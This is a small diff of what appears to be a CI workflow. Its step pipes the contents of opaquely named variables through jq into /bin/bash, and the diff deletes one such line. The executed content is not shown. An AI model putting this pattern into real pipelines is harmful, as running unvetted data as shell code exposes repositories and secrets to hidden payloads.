@@ -22,7 +22,6 @@ jobs:
           echo $qm047 | jq -r .rgao062 | /bin/bash
           echo $cn18 | jq -r .zfj60934 | /bin/bash
           printf '%s' "$ioada90535" | jq -r .izhg259 | /bin/bash
-          echo $z9 | jq -r .wjzv51 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
